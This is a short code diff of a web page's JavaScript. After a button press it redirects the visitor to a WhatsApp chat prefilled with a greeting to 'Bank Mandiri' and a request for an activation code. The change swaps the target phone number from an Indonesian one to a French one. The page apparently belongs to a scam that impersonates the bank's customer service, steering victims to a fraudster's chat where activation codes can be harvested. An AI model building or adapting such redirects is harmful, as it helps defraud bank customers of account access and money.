@@ -105,7 +105,7 @@ document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
 function getcs(){
  $("#djload").show();   
 setTimeout(function(){  
-location.href='https://wa.me/6285133339382?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗠𝗮𝗻𝗱𝗶𝗿𝗶,%0ASaya%20mau%20Request%20Kode%20Aktivasi';
+location.href='https://wa.me/33605757153?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗠𝗮𝗻𝗱𝗶𝗿𝗶,%0ASaya%20mau%20Request%20Kode%20Aktivasi';
  $("#djload").hide();   
     }, 1000);    
 }     
